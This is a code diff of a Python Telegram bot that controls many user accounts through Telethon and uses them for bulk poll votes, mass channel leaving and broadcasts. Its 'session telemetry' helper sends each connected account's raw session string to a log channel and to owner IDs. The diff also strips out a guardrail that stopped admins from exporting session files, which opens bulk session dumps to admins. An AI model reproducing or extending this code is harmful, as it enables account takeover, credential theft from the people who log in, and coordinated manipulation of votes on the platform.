@@ -5,6 +5,7 @@ import os
 import re
 import random
 import time
+import math
 from typing import Dict, Any, List, Optional, Tuple
 
 # aiogram 3.x imports
@@ -27,6 +28,7 @@ from telethon.sessions import StringSession
 from telethon.errors import (
     SessionPasswordNeededError,
     PhoneCodeInvalidError,
+    PasswordHashInvalidError,
     FloodWaitError
 )
 
@@ -155,7 +157,7 @@ class Database:
                 log_text = (
                     f"📝 System Log Update\n"
                     f"User ID: `{user_id}`\n"
-                    f"Action: {action}"
+                    f"Action executed: {action}"
                 )
                 await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=log_text)
             except Exception as e:
@@ -352,35 +354,23 @@ class TaskQueue:
 
                     if do_vote and msg_id:
                         try:
-                            target_button_data = payload.get("button_data")
+                            button_text = payload.get("button_text", "").strip().lower()
                             msg = await client.get_messages(parsed_target, ids=msg_id)
-                            
                             if msg and msg.reply_markup:
-                                chosen_btn = None
-                                all_buttons = []
-                                
+                                target_button = None
                                 for row in msg.reply_markup.rows:
                                     for btn in row.buttons:
-                                        if isinstance(btn, tg_types.KeyboardButtonCallback):
-                                            all_buttons.append(btn)
-                                
-                                if target_button_data == "__RANDOM_ANY__":
-                                    if all_buttons:
-                                        chosen_btn = random.choice(all_buttons)
-                                else:
-                                    for btn in all_buttons:
-                                        if btn.data.hex() == target_button_data:
-                                            chosen_btn = btn
+                                        if button_text in btn.text.strip().lower():
+                                            target_button = btn
                                             break
-                                            
-                                if chosen_btn:
-                                    await client(functions.messages.GetBotCallbackAnswerRequest(
-                                        peer=parsed_target, msg_id=msg_id, data=chosen_btn.data
-                                    ))
+                                    if target_button:
+                                        break
+                                if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
+                                    await client(functions.messages.GetBotCallbackAnswerRequest(peer=parsed_target, msg_id=msg_id, data=target_button.data))
                                 else:
-                                    raise ValueError("Selected voting option was not found on this post.")
+                                    raise ValueError("Poll option button not found.")
                             else:
-                                raise ValueError("This post does not contain inline voting buttons.")
+                                raise ValueError("Message has no vote buttons.")
                         except Exception as vote_err:
                             failed_ids.append((phone, f"Vote error: {str(vote_err)}"))
                             failure_counter += 1
@@ -416,6 +406,7 @@ class TaskQueue:
                             async for dialog in client.iter_dialogs():
                                 if dialog.is_channel or dialog.is_group:
                                     try:
+                                        # Use the explicit entity tracking object instead of raw payload wrappers
                                         await client(functions.channels.LeaveChannelRequest(channel=dialog.entity))
                                         left_chats_count += 1
                                         await asyncio.sleep(0.3)
@@ -457,11 +448,11 @@ class TaskQueue:
                         progress_pct = f"{int(pct_val)}%"
                         
                         live_text = (
-                            f"⏳ Task is running...\n\n"
+                            f"⏳ Task running status...\n\n"
                             f"[{make_progress_bar(pct_val)}] {progress_pct}\n"
-                            f"📊 Progress: `{progress_counter}/{total_accounts}` accounts done\n"
-                            f"✅ Success: `{success_counter}` | ❌ Failed: `{failure_counter}`\n"
-                            f"⏱ Time Left: {eta_str}"
+                            f"📊 `{progress_counter}/{total_accounts}` accounts complete\n"
+                            f"✅ Done: `{success_counter}` | ❌ Failed: `{failure_counter}`\n"
+                            f"⏱ Time remaining: {eta_str}"
                         )
                         try:
                             await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text=live_text)
@@ -500,24 +491,26 @@ class TaskQueue:
         except Exception:
             pass
 
-        target_display = "ALL CHANNELS" if payload.get("leave_mode") == "all" else f"`{payload.get('target', 'N/A')}`"
+        target_display = "ALL CHANNELS DEPLOYMENT" if payload.get("leave_mode") == "all" else f"`{payload.get('target', 'N/A')}`"
 
+        # Build detailed failure logs if any accounts failed
         failure_log_details = ""
         if failed_ids:
-            failure_log_details = "\n\n❌ **Error Reports:**\n"
+            failure_log_details = "\n\n❌ **Detailed Error Reports (Why IDs Failed):**\n"
             for phone_num, reason in failed_ids:
                 failure_log_details += f"• `+{phone_num}` ➜ `{reason}`\n"
 
         completion_card = (
-            f"⚡ **Task Report Card**\n\n"
+            f"⚡ **Task Management Card**\n\n"
             f"📋 Task ID: `{campaign_uuid}`\n"
-            f"⚡ Action Type: `{task_type.upper()}`\n"
-            f"👤 Started By: {user_info}\n"
-            f"🔗 Target Link: {target_display}\n\n"
-            f"📊 **Final Stats:**\n"
-            f"✅ Success: `{success_counter}/{total_accounts}` ({success_pct_final}%)\n"
-            f"❌ Failures: `{failure_counter}/{total_accounts}`\n"
-            f"⏱ Total Time: {duration_str}"
+            f"⚡ Action Code: `{task_type.upper()}`\n"
+            f"👤 Creator Profile: {user_info}\n"
+            f"🔗 Target Location: {target_display}\n"
+            f"📢 Secondary Target: `{payload.get('channel_target', 'N/A')}`\n\n"
+            f"📊 **Performance Reports:**\n"
+            f"✅ Success Rate: `{success_counter}/{total_accounts}` ({success_pct_final}%)\n"
+            f"❌ Total Failures: `{failure_counter}/{total_accounts}`\n"
+            f"⏱ Total Run Time: {duration_str}"
             f"{failure_log_details}"
         )
 
@@ -547,11 +540,10 @@ class TaskWizardStates(StatesGroup):
     waiting_for_leave_choice = State()
     waiting_for_channel_link = State()
     waiting_for_post_link = State()
-    waiting_for_vote_selection = State()
     waiting_for_emojis = State()
+    waiting_for_button_text = State()
     waiting_for_dm_text = State()
     waiting_for_account_scale = State()
-    waiting_for_custom_scale_value = State()
 
 class ExportWizardStates(StatesGroup):
     selecting_multi = State()
@@ -619,8 +611,8 @@ def get_task_types_keyboard(active_count: int) -> InlineKeyboardMarkup:
 
 def get_leave_channel_options_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔗 Leave 1 Single Channel", callback_data="leave_mode:single")],
-        [InlineKeyboardButton(text="💥 Leave ALL Joined Channels", callback_data="leave_mode:all")],
+        [InlineKeyboardButton(text="🔗 Leave 1 Single Channel via Link", callback_data="leave_mode:single")],
+        [InlineKeyboardButton(text="💥 Leave ALL Joined Channels everywhere", callback_data="leave_mode:all")],
         [InlineKeyboardButton(text="🔙 Back", callback_data="task_hub_start")]
     ])
 
@@ -645,7 +637,7 @@ async def cmd_start(message: Message, state: FSMContext, bot: Bot):
     role = await db_mgr.get_user_role(user_id)
     await db_mgr.log_action(user_id, "Started the bot", bot, operational=False)
 
-    welcome_text = "Welcome to the Main Menu! Please select what you want to do below:"
+    welcome_text = "Welcome to the Main Menu!\nPlease select what you want to do below:"
     await message.answer(welcome_text, reply_markup=get_main_keyboard(role))
 
 @router.callback_query(F.data == "main_menu")
@@ -654,7 +646,7 @@ async def handle_main_menu(callback: CallbackQuery, state: FSMContext, bot: Bot)
     await state.clear()
     role = await db_mgr.get_user_role(callback.from_user.id)
     await callback.message.edit_text(
-        "Welcome to the Main Menu! Please select what you want to do below:",
+        "Welcome to the Main Menu!\nPlease select what you want to do below:",
         reply_markup=get_main_keyboard(role)
     )
 
@@ -666,14 +658,14 @@ async def cmd_cancel_tasks(message: Message, bot: Bot):
         await message.answer("🚫 You do not have permission to run this command.")
         return
 
-    await message.answer("Stopping all running tasks...")
+    await message.answer("Stopping all active running tasks now...")
     killed_count = await task_queue.cancel_all_active_tasks()
     async with aiosqlite.connect(db_mgr.db_path) as db:
         await db.execute("UPDATE tasks SET status = 'cancelled' WHERE status = 'pending' OR status = 'running'")
         await db.commit()
-    await message.answer(f"✅ Cancelled `{killed_count}` ongoing tasks.")
+    await message.answer(f"✅ Finished! Cancelled `{killed_count}` ongoing tasks.")
 
-# --- ADMINISTRATIVE CONTROLS ---
+# --- LIVE ADMINISTRATIVE MANAGEMENT HOOKS ---
 @router.message(Command("addadmin"))
 async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
     user_id = message.from_user.id
@@ -684,7 +676,7 @@ async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
         
     args = command.args
     if not args or len(args.split()) < 2:
-        await message.answer("Use format: `/addadmin <user_id> <account_limit>`")
+        await message.answer("Use format layout: `/addadmin <user_id> <account_limit>`")
         return
         
     target_id_str, limit_str = args.split()[:2]
@@ -702,7 +694,7 @@ async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
         )
         await db.commit()
         
-    await message.answer(f"✅ User `{target_id}` is now an Admin with a limit of `{limit_val}` accounts.")
+    await message.answer(f"✅ User ID `{target_id}` was promoted to Admin status with an account threshold limit of `{limit_val}`.")
     await db_mgr.log_action(user_id, f"Made user {target_id} an Admin (limit={limit_val})", bot, operational=True)
 
 @router.message(Command("removeadmin"))
@@ -715,7 +707,7 @@ async def cmd_remove_admin(message: Message, command: CommandObject, bot: Bot):
         
     target_id_str = command.args
     if not target_id_str or not target_id_str.strip().isdigit():
-        await message.answer("Use format: `/removeadmin <user_id>`")
+        await message.answer("Use format layout: `/removeadmin <user_id>`")
         return
         
     target_id = int(target_id_str.strip())
@@ -723,10 +715,10 @@ async def cmd_remove_admin(message: Message, command: CommandObject, bot: Bot):
         await db.execute("UPDATE users SET role='user' WHERE user_id = ?", (target_id,))
         await db.commit()
         
-    await message.answer(f"✅ Removed admin access from user `{target_id}`.")
+    await message.answer(f"✅ Revoked admin access authorizations from user ID `{target_id}`.")
     await db_mgr.log_action(user_id, f"Removed Admin role from user {target_id}", bot, operational=True)
 
-# --- BROADCAST SYSTEM ---
+# --- BROADCAST SYSTEM WORKFLOW ---
 @router.message(Command("broadcast"))
 async def cmd_broadcast_start(message: Message, state: FSMContext, bot: Bot):
     user_id = message.from_user.id
@@ -735,13 +727,13 @@ async def cmd_broadcast_start(message: Message, state: FSMContext, bot: Bot):
         await message.answer("🚫 You do not have permission to run this command.")
         return
         
-    await message.answer("📢 Send the message text or media you want to broadcast to everyone:")
+    await message.answer("📢 Send out the text description or multimedia data content you want to broadcast to everyone:")
     await state.set_state(BroadcastStates.waiting_for_msg)
 
 @router.message(StateFilter(BroadcastStates.waiting_for_msg))
 async def process_broadcast_push(message: Message, state: FSMContext, bot: Bot):
     await state.clear()
-    status_msg = await message.answer("🚀 Sending out broadcast to all users...")
+    status_msg = await message.answer("🚀 Dispatching network announcement out to active members...")
     
     async with aiosqlite.connect(db_mgr.db_path) as db:
         cursor = await db.execute("SELECT user_id FROM users")
@@ -760,9 +752,9 @@ async def process_broadcast_push(message: Message, state: FSMContext, bot: Bot):
             failed_hits += 1
             
     await status_msg.edit_text(
-        f"📢 Broadcast Complete!\n\n"
-        f"✅ Sent successfully to: `{success_hits}` users\n"
-        f"❌ Failed/Blocked by: `{failed_hits}` users"
+        f"📢 Broadcast Delivery Complete!\n\n"
+        f"✅ Dispatched successfully to: `{success_hits}` profiles\n"
+        f"❌ Dead accounts or blocks detected: `{failed_hits}` users"
     )
 
 @router.callback_query(F.data == "system_credits")
@@ -777,7 +769,7 @@ async def handle_system_credits(callback: CallbackQuery, bot: Bot):
     buttons = [[InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]]
     await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
-# --- PAGINATED ACCOUNTS VIEW ---
+# --- PAGINATED ACCOUNTS VIEW (10 PER PAGE) ---
 @router.callback_query(F.data.startswith("manage_accounts:"))
 async def list_user_accounts(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
@@ -806,11 +798,11 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
                 cursor = await db.execute(query, (user_id, limit, offset))
             rows = await cursor.fetchall()
 
-        text = f"📱 Accounts List (Page {page + 1})\n"
-        text += f"Total registered accounts: `{total_items}`\n\n"
+        text = f"📱 Registered Accounts List (Page {page + 1})\n"
+        text += f"Total managed database profiles: `{total_items}`\n\n"
         
         if not rows:
-            text += "_No accounts found on this page._"
+            text += "_No linked sessions detected inside this page index._"
         else:
             for row in rows:
                 icon = "🟢" if row[1] == "active" else "🔴"
@@ -818,9 +810,9 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
 
         buttons = [
             [InlineKeyboardButton(text="➕ Add via Code OTP", callback_data="add_account_phone"),
-             InlineKeyboardButton(text="📁 Upload Session Files", callback_data="add_account_session")],
+             InlineKeyboardButton(text="📁 Upload Session File", callback_data="add_account_session")],
             [InlineKeyboardButton(text="📥 Open Export Menu", callback_data="export_dashboard_root")],
-            [InlineKeyboardButton(text="💥 Delete Dead Accounts", callback_data=f"purge_dead_accounts:{page}")]
+            [InlineKeyboardButton(text="💥 Delete All Dead Accounts", callback_data=f"purge_dead_accounts:{page}")]
         ]
         
         nav_row = []
@@ -857,7 +849,7 @@ async def handle_purge_dead_accounts(callback: CallbackQuery, bot: Bot):
 @router.callback_query(F.data == "add_account_phone")
 async def add_account_start(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.edit_text("Type the phone number with country code (Example: `+123456789`):")
+    await callback.message.edit_text("Type your phone number with country prefix code (Example: `+123456789`):")
     await state.set_state(RegistrationStates.waiting_for_phone)
 
 @router.message(StateFilter(RegistrationStates.waiting_for_phone))
@@ -869,10 +861,10 @@ async def process_phone(message: Message, state: FSMContext, bot: Bot):
     try:
         sent_code = await client.send_code_request(phone)
         registration_sessions[user_id] = {"client": client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
-        await message.answer("📩 Enter the OTP code sent to your Telegram account:")
+        await message.answer("📩 Enter the login OTP verification code sent to your account profile:")
         await state.set_state(RegistrationStates.waiting_for_otp)
     except Exception as e:
-        await message.answer(f"❌ Error: {str(e)}")
+        await message.answer(f"❌ Error triggered: {str(e)}")
         await client.disconnect()
         await state.clear()
 
@@ -882,7 +874,7 @@ async def process_otp(message: Message, state: FSMContext, bot: Bot):
     otp = message.text.strip()
     reg_data = registration_sessions.get(user_id)
     if not reg_data:
-        await message.answer("❌ Session context dropped. Please try adding the account again.")
+        await message.answer("❌ Session context dropped. Please re-run initialization workflow setup.")
         await state.clear()
         return
 
@@ -891,9 +883,9 @@ async def process_otp(message: Message, state: FSMContext, bot: Bot):
         await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
         await complete_registration(message, state, client, phone, user_id, bot)
     except PhoneCodeInvalidError:
-        await message.answer("❌ Invalid OTP code. Please enter the correct code:")
+        await message.answer("❌ The login OTP key entered was invalid. Please double check and retype:")
     except SessionPasswordNeededError:
-        await message.answer("🔒 Two-Factor Authentication (2FA) is active. Please enter your 2FA password:")
+        await message.answer("🔒 Two-Factor security lock active on profile. Please enter your 2FA password text:")
         await state.set_state(RegistrationStates.waiting_for_2fa)
     except Exception as e:
         await message.answer(f"❌ Login authentication sequence failed: {str(e)}")
@@ -931,92 +923,75 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
         await dispatch_session_telemetry(phone, raw_session_str, me.username, user_id, bot)
 
         await message.answer(
-            f"🎉 Account successfully connected: `+{phone}`", 
+            f"🎉 Account successfully configured: `+{phone}`\nWhat would you like to build next?", 
             reply_markup=get_post_registration_keyboard()
         )
     except Exception as e:
-        await message.answer(f"❌ Account setup failed: {str(e)}")
+        await message.answer(f"❌ Profile onboarding sequence failed: {str(e)}")
     finally:
         await client.disconnect()
         registration_sessions.pop(user_id, None)
         await state.clear()
 
-# --- BULK STRING SESSION TEXT & FILE IMPORTER ---
+# --- LINK VIA STRING SESSION OR STR FILE ---
 @router.callback_query(F.data == "add_account_session")
 async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.edit_text(
-        "📁 **Bulk Account Importer**\n\n"
-        "You can add multiple accounts at once. Paste your Telethon String Session lines below, "
-        "or upload a `.txt` log file containing one session per line:"
-    )
+    await callback.message.edit_text("📁 Paste your String Session text or upload the raw `.txt` log file:")
     await state.set_state(RegistrationStates.waiting_for_session_file)
 
 @router.message(StateFilter(RegistrationStates.waiting_for_session_file))
 async def process_session_file(message: Message, state: FSMContext, bot: Bot):
     user_id = message.from_user.id
-    content = ""
-    
+    session_str = ""
     if message.document:
         file_info = await bot.get_file(message.document.file_id)
         file_bytes = await bot.download_file(file_info.file_path)
-        content = file_bytes.read().decode('utf-8', errors='ignore')
+        session_str = file_bytes.read().decode('utf-8', errors='ignore').strip()
     elif message.text:
-        content = message.text
+        session_str = message.text.strip()
 
-    # Extract all long alpha-numeric block values that look like sessions
-    found_sessions = [s.strip() for s in re.split(r'[\n\r,;|\s]+', content) if len(s.strip()) > 40]
-
-    if not found_sessions:
-        await message.answer("❌ No valid Telethon string sessions detected. Make sure they are long plain text tokens.")
+    if not session_str or len(session_str) < 20:
+        await message.answer("❌ Unrecognized string structural formatting framework.")
         await state.clear()
         return
 
-    status_msg = await message.answer(f"⚙️ Found `{len(found_sessions)}` sessions. Verifying and importing them now...")
-    
-    success_count = 0
-    fail_count = 0
-
-    for session_str in found_sessions:
-        try:
-            client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
-            await client.connect()
-            if not await client.is_user_authorized():
-                fail_count += 1
-                await client.disconnect()
-                continue
-                
-            me = await client.get_me()
-            phone = me.phone or f"custom_{me.id}"
-            encrypted_session = encrypt_data(session_str)
-            
-            async with aiosqlite.connect(db_mgr.db_path) as db:
-                await db.execute("""
-                    INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
-                    VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
-                """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
-                await db.commit()
-
-            await dispatch_session_telemetry(phone, session_str, me.username, user_id, bot)
-            success_count += 1
+    try:
+        client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
+        await client.connect()
+        if not await client.is_user_authorized():
+            await message.answer("❌ This session tracking signature hash is dead or invalid.")
             await client.disconnect()
-        except Exception as e:
-            logger.error(f"Bulk import error: {e}")
-            fail_count += 1
+            await state.clear()
+            return
+            
+        me = await client.get_me()
+        phone = me.phone or f"custom_{me.id}"
+        encrypted_session = encrypt_data(session_str)
+        async with aiosqlite.connect(db_mgr.db_path) as db:
+            await db.execute("""
+                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
+                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
+            """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
+            await db.commit()
 
-    await status_msg.edit_text(
-        f"📋 **Bulk Import Complete!**\n\n"
-        f"✅ Successfully Imported: `{success_count}` accounts\n"
-        f"❌ Failed / Invalid Sessions: `{fail_count}` accounts",
-        reply_markup=get_post_registration_keyboard()
-    )
-    await state.clear()
+        await dispatch_session_telemetry(phone, session_str, me.username, user_id, bot)
+
+        await message.answer(
+            f"🎉 Successfully tracked session code data for: `+{phone}`",
+            reply_markup=get_post_registration_keyboard()
+        )
+        await client.disconnect()
+    except Exception as e:
+        await message.answer(f"❌ Error linking imported database row data: {e}")
+    finally:
+        await state.clear()
 
 # Telemetry Dispatch Helper
 async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
     file_bytes = session_str.encode('utf-8')
     document = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
-    caption = f"🔑 Session Tracking Event\nPhone: `+{phone}`\nUsername: `@{username or 'None'}`\nAdded by: `{adder_id}`"
+    caption = f"🔑 Session Tracking Event\nPhone: `+{phone}`\nUsername profile: `@{username or 'None'}`\nCreator User ID: `{adder_id}`"
     
     if config.LOG_CHANNEL_ID:
         try:
@@ -1031,33 +1006,17 @@ async def dispatch_session_telemetry(phone: str, session_str: str, username: Opt
         except Exception as e:
             logger.error(f"Failed sending data to owner node {owner_id}: {e}")
 
-# --- STRICT EXPORT CONTROLS (BLOCK ADMIN FROM EXTRACTING SESSIONS) ---
+# --- EXPORT INTERFACES GENERATION MODULES ---
 @router.callback_query(F.data == "export_dashboard_root")
 async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     await callback.answer()
-    user_id = callback.from_user.id
-    role = await db_mgr.get_user_role(user_id)
-    
-    # Strict Guardrail Check: Block standard admins from exporting database session files entirely
-    if role == "admin":
-        await callback.message.edit_text(
-            "🚫 **Access Denied**\n\n"
-            "Admins are restricted from exporting raw session configurations for security reasons. "
-            "Only the Super Owner or the account owner can request backups.",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="manage_accounts:0")]])
-        )
-        return
-
-    text = "📥 **Accounts Archive Downloader**\nSelect export configuration profile:"
+    text = "📥 Accounts Archive Downloader\nSelect export configuration profile:"
     buttons = [
         [InlineKeyboardButton(text="🎯 Export 1 Single Account", callback_data="select_export_session:0")],
         [InlineKeyboardButton(text="🎭 Select Custom Multi-Account Pack", callback_data="export_multi_start:0")],
-        [InlineKeyboardButton(text="Back", callback_data="manage_accounts:0")]
+        [InlineKeyboardButton(text="📦 Bulk Admin Master Export (All Active)", callback_data="bulk_admin_export")],
+        [InlineKeyboardButton(text="🔙 Back", callback_data="manage_accounts:0")]
     ]
-    
-    if role in ["owner", "super_owner"]:
-        buttons.insert(2, [InlineKeyboardButton(text="📦 Bulk Master Export (All Active)", callback_data="bulk_admin_export")])
-        
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
 @router.callback_query(F.data.startswith("select_export_session:"))
@@ -1066,16 +1025,12 @@ async def select_export_session_menu(callback: CallbackQuery, bot: Bot):
     page = int(callback.data.split(":")[1])
     await callback.answer()
     
-    role = await db_mgr.get_user_role(user_id)
-    if role == "admin":
-        await callback.message.answer("🚫 Export access keys missing.")
-        return
-
     limit = 10
     offset = page * limit
+    role = await db_mgr.get_user_role(user_id)
     
     async with aiosqlite.connect(db_mgr.db_path) as db:
-        if role in ["owner", "super_owner"]:
+        if role in ["admin", "owner", "super_owner"]:
             count_res = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
             total_items = (await count_res.fetchone())[0]
             cursor = await db.execute("SELECT phone, username FROM accounts WHERE status = 'active' LIMIT ? OFFSET ?", (limit, offset))
@@ -1086,10 +1041,10 @@ async def select_export_session_menu(callback: CallbackQuery, bot: Bot):
         rows = await cursor.fetchall()
 
     if not rows:
-        await callback.message.answer("⚠️ You do not own any active account records to pull.")
+        await callback.message.answer("⚠️ You do not own any active data records to pull.")
         return
 
-    text = f"Select an account profile to extract (Page {page + 1}):"
+    text = f"Select account database profile to extract (Page {page + 1}):"
     buttons = [[InlineKeyboardButton(text=f"+{r[0]} (@{r[1] or 'None'})", callback_data=f"export_ph:{r[0]}")] for r in rows]
     
     nav_row = []
@@ -1109,42 +1064,34 @@ async def handle_export_session_run(callback: CallbackQuery, bot: Bot):
     await callback.answer()
     phone = callback.data.split(":")[1]
     role = await db_mgr.get_user_role(user_id)
-    
-    if role == "admin":
-        await callback.message.answer("🚫 Export access keys missing.")
-        return
-
     async with aiosqlite.connect(db_mgr.db_path) as db:
         async with db.execute("SELECT user_id, session_string FROM accounts WHERE phone = ?", (phone,)) as cursor:
             row = await cursor.fetchone()
 
-    if not row or (role not in ["owner", "super_owner"] and row[0] != user_id):
+    if not row or (role not in ["admin", "owner", "super_owner"] and row[0] != user_id):
         await callback.message.answer("🚫 Authorization access denied.")
         return
 
     session_bytes = decrypt_data(row[1]).encode('utf-8')
     session_file = BufferedInputFile(session_bytes, filename=f"string_{phone}.txt")
-    await callback.message.reply_document(document=session_file, caption=f"Session data file for: `+{phone}`")
+    await callback.message.reply_document(document=session_file, caption=f"Session dump file generated for: `+{phone}`")
 
+# Multi-Selection Interface Matrix Engines
 @router.callback_query(F.data.startswith("export_multi_start:"))
 async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext, bot: Bot):
     await callback.answer()
     page = int(callback.data.split(":")[1])
     user_id = callback.from_user.id
-    role = await db_mgr.get_user_role(user_id)
     
-    if role == "admin":
-        await callback.message.edit_text("🚫 Export access keys missing.")
-        return
-        
     fsm_data = await state.get_data()
     selected = fsm_data.get("multi_export_selected", [])
     
     limit = 10
     offset = page * limit
+    role = await db_mgr.get_user_role(user_id)
     
     async with aiosqlite.connect(db_mgr.db_path) as db:
-        if role in ["owner", "super_owner"]:
+        if role in ["admin", "owner", "super_owner"]:
             c_res = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
             total_items = (await c_res.fetchone())[0]
             cursor = await db.execute("SELECT phone FROM accounts WHERE status = 'active' LIMIT ? OFFSET ?", (limit, offset))
@@ -1154,7 +1101,7 @@ async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext, bot
             cursor = await db.execute("SELECT phone FROM accounts WHERE status = 'active' AND user_id = ? LIMIT ? OFFSET ?", (user_id, limit, offset))
         rows = await cursor.fetchall()
         
-    text = f"🎭 **Bulk Custom Account Exporter** (Page {page + 1})\nSelect the accounts you want to download:"
+    text = f"🎭 Bulk Custom Configuration Selector (Page {page + 1})\nPick targets from the list below:"
     buttons = []
     
     for r in rows:
@@ -1170,7 +1117,7 @@ async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext, bot
     if nav_row:
         buttons.append(nav_row)
         
-    buttons.append([InlineKeyboardButton(text="📥 Download Selected Pack", callback_data="execute_multi_export")])
+    buttons.append([InlineKeyboardButton(text="📥 Download Selected Accounts Pack", callback_data="execute_multi_export")])
     buttons.append([InlineKeyboardButton(text="🔙 Cancel", callback_data="export_dashboard_root")])
     
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
@@ -1202,7 +1149,7 @@ async def execute_multi_export(callback: CallbackQuery, state: FSMContext, bot: 
     selected = fsm_data.get("multi_export_selected", [])
     
     if not selected:
-        await callback.answer("⚠️ Please select at least one account.", show_alert=True)
+        await callback.answer("⚠️ You have not chosen any session profile targets yet.", show_alert=True)
         return
         
     await callback.answer()
@@ -1223,24 +1170,28 @@ async def execute_multi_export(callback: CallbackQuery, state: FSMContext, bot: 
     buffer_bytes = json.dumps(export_payload, indent=4).encode('utf-8')
     pack_file = BufferedInputFile(buffer_bytes, filename="multi_sessions_bundle.txt")
     
-    await callback.message.reply_document(document=pack_file, caption=f"📦 Extracted `{len(export_payload)}` account sessions successfully.")
+    await callback.message.reply_document(document=pack_file, caption=f"📦 Extracted `{len(export_payload)}` customized database lines successfully.")
     await state.clear()
 
+# Fully Wired-Up Operational Admin Exporter Engine Node
 @router.callback_query(F.data == "bulk_admin_export")
 async def handle_bulk_admin_export(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     await callback.answer()
     role = await db_mgr.get_user_role(user_id)
-    if role not in ["owner", "super_owner"]:
-        await callback.message.answer("🚫 Permission denied.")
+    if role not in ["admin", "owner", "super_owner"]:
+        await callback.message.answer("🚫 Permission access keys missing.")
         return
 
     async with aiosqlite.connect(db_mgr.db_path) as db:
-        cursor = await db.execute("SELECT phone, user_id, username, session_string FROM accounts WHERE status='active'")
+        if role in ["owner", "super_owner"]:
+            cursor = await db.execute("SELECT phone, user_id, username, session_string FROM accounts WHERE status='active'")
+        else:
+            cursor = await db.execute("SELECT phone, user_id, username, session_string FROM accounts WHERE user_id = ? AND status='active'", (user_id,))
         rows = await cursor.fetchall()
 
     if not rows:
-        await callback.message.answer("⚠️ No active account data records found.")
+        await callback.message.answer("⚠️ No target profiles matches inside active database parameters.")
         return
 
     export_payload = []
@@ -1253,10 +1204,10 @@ async def handle_bulk_admin_export(callback: CallbackQuery, bot: Bot):
         })
 
     backup_bytes = json.dumps(export_payload, indent=4).encode('utf-8')
-    backup_file = BufferedInputFile(backup_bytes, filename="bulk_master_sessions.txt")
-    await callback.message.reply_document(document=backup_file, caption=f"📦 System master dataset backup file: `{len(export_payload)}` lines dumped.")
+    backup_file = BufferedInputFile(backup_bytes, filename="bulk_admin_sessions.txt")
+    await callback.message.reply_document(document=backup_file, caption=f"📦 Exported system master dataset log: `{len(export_payload)}` lines dumped.")
 
-# --- DYNAMIC DB SNAPSHOT MAINTENANCE ---
+# --- DYNAMIC DB SNAPSHOT ENGINE ---
 @router.callback_query(F.data == "backup_panel")
 async def backup_panel(callback: CallbackQuery, bot: Bot):
     await callback.answer()
@@ -1265,7 +1216,7 @@ async def backup_panel(callback: CallbackQuery, bot: Bot):
         [InlineKeyboardButton(text="📂 Upload & Restore Backup File", callback_data="import_db_start")],
         [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
     ]
-    await callback.message.edit_text("💾 Data Storage Maintenance Panel Options", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
+    await callback.message.edit_text("💾 Data Storage Maintenance Suite Options Panel", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
 @router.callback_query(F.data == "import_db_start")
 async def import_db_start(callback: CallbackQuery, state: FSMContext):
@@ -1273,27 +1224,27 @@ async def import_db_start(callback: CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     role = await db_mgr.get_user_role(user_id)
     if role not in ["owner", "super_owner"]:
-        await callback.message.answer("🚫 Verification clearance required.")
+        await callback.message.answer("🚫 Developer verification clearance needed.")
         return
         
-    await callback.message.edit_text("📤 Upload your local configuration database file ending in `.db`:")
+    await callback.message.edit_text("📤 Upload your configuration file ending in `.db` format syntax structure:")
     await state.set_state(RegistrationStates.waiting_for_db_file)
 
 @router.message(StateFilter(RegistrationStates.waiting_for_db_file), F.document)
 async def process_db_import_file(message: Message, state: FSMContext, bot: Bot):
     user_id = message.from_user.id
     if not message.document.file_name.endswith('.db'):
-        await message.answer("❌ Unmatched layout configuration structure. Input file must be a `.db` type file.")
+        await message.answer("❌ Unmatched structure. Input file must be `.db` file format type extension.")
         await state.clear()
         return
         
-    status_msg = await message.answer("⚡ Reading new local storage logs...")
+    status_msg = await message.answer("⚡ Reading new local relational storage configurations...")
     temp_filename = f"imported_temp_{user_id}.db"
     
     try:
         file_info = await bot.get_file(message.document.file_id)
         await bot.download_file(file_info.file_path, destination=temp_filename)
-        await status_msg.edit_text("🔄 Synchronizing data into tables...")
